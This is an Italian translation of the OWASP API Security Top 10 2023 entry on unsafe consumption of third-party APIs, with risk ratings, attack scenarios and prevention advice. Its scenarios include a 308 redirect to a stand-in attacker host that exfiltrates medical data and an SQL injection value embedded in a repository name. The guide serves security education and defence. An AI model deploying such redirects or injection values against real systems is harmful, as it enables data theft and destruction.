# API10:2023 Unsafe Consumption of APIs

| Agenti di Minaccia/Vettori di Attacco | Debolezza di Sicurezza | Impatti |
| - | - | - |
| Specifico per API : Sfruttabilità **Facile** | Diffusione **Comune** : Rilevabilità **Media** | Tecnico **Grave** : Specifico per il Business |
| Sfruttare questo problema richiede che gli attaccanti identifichino e compromettano potenzialmente altre API/servizi con cui l'API target è integrata. Di solito queste informazioni non sono pubblicamente disponibili o l'API/servizio integrato non è facilmente sfruttabile. | Gli sviluppatori tendono a fidarsi degli endpoint che interagiscono con API esterne o di terze parti senza verificarli, affidandosi a requisiti di sicurezza più deboli, ad esempio in materia di sicurezza del trasporto, autenticazione/autorizzazione e validazione e sanificazione dell'input. Gli attaccanti devono identificare i servizi con cui l'API target si integra (fonti di dati) e, eventualmente, comprometterli. | L'impatto varia in base a ciò che l'API target fa con i dati recuperati. Un exploit riuscito può portare all'esposizione di informazioni sensibili a soggetti non autorizzati, a vari tipi di injection, o a denial of service. |

## L'API è Vulnerabile?

Gli sviluppatori tendono a fidarsi dei dati ricevuti da API di terze parti più
che dell'input degli utenti. Ciò è particolarmente vero per le API offerte da
aziende note. Per questo motivo, gli sviluppatori tendono ad adottare standard
di sicurezza più deboli, ad esempio riguardo alla validazione e sanificazione
dell'input.

L'API potrebbe essere vulnerabile se:

* Interagisce con altre API su un canale non cifrato;
* Non valida e sanifica correttamente i dati raccolti da altre API prima di
  elaborarli o passarli a componenti downstream;
* Segue ciecamente i redirect;
* Non limita il numero di risorse disponibili per elaborare le risposte dei
  servizi di terze parti;
* Non implementa timeout per le interazioni con servizi di terze parti;

## Scenari di Attacco di Esempio

### Scenario #1

Un'API si affida a un servizio di terze parti per arricchire gli indirizzi
aziendali forniti dagli utenti. Quando un indirizzo viene fornito all'API
dall'utente finale, viene inviato al servizio di terze parti e i dati restituiti
vengono poi archiviati in un database SQL locale.

Degli attaccanti utilizzano il servizio di terze parti per archiviare un payload
SQLi associato a un'azienda da loro creata. Poi si rivolgono all'API vulnerabile
fornendo un input specifico che la induce a recuperare la loro "azienda
malevola" dal servizio di terze parti. Il payload SQLi finisce per essere
eseguito dal database, esfiltrandone i dati verso un server controllato
dall'attaccante.

### Scenario #2

Un'API si integra con un fornitore di servizi di terze parti per archiviare in
modo sicuro informazioni mediche sensibili degli utenti. I dati vengono inviati
tramite una connessione sicura utilizzando una richiesta HTTP come quella
seguente:

```
POST /user/store_phr_record
{
  "genome": "ACTAGTAG__TTGADDAAIICCTT…"
}
```

Gli attaccanti trovano un modo per compromettere l'API di terze parti, che
inizia a rispondere con un `308 Permanent Redirect` alle richieste come quella
precedente.

```
HTTP/1.1 308 Permanent Redirect
Location: https://attacker.com/
```

Poiché l'API segue ciecamente i redirect di terze parti, ripeterà la stessa
identica richiesta includendo i dati sensibili dell'utente, ma questa volta
verso il server dell'attaccante.

### Scenario #3

Un attaccante può preparare un repository Git chiamato `'; drop db;--`.

Quando un'applicazione vulnerabile effettua un'integrazione con il repository
malevolo, il payload SQL injection viene utilizzato su un'applicazione che
costruisce una query SQL ritenendo che il nome del repository sia un input
sicuro.

## Come Prevenire

* Quando si valutano i fornitori di servizi, verificare la loro postura di
  sicurezza delle API.
* Assicurarsi che tutte le interazioni API avvengano su un canale di
  comunicazione sicuro (TLS).
* Validare e sanificare sempre correttamente i dati ricevuti dalle API integrate
  prima di utilizzarli.
* Mantenere una allowlist di posizioni note verso cui le API integrate potrebbero
  reindirizzare le tue API: non seguire ciecamente i redirect.

## Riferimenti

### OWASP

* [Web Service Security Cheat Sheet][1]
* [Injection Flaws][2]
* [Input Validation Cheat Sheet][3]
* [Injection Prevention Cheat Sheet][4]
* [Transport Layer Protection Cheat Sheet][5]
* [Unvalidated Redirects and Forwards Cheat Sheet][6]

### Esterni

* [CWE-20: Improper Input Validation][7]
* [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor][8]
* [CWE-319: Cleartext Transmission of Sensitive Information][9]

[1]: https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html
[2]: https://www.owasp.org/index.php/Injection_Flaws
[3]: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
[4]: https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
[5]: https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html
[6]: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
[7]: https://cwe.mitre.org/data/definitions/20.html
[8]: https://cwe.mitre.org/data/definitions/200.html
[9]: https://cwe.mitre.org/data/definitions/319.html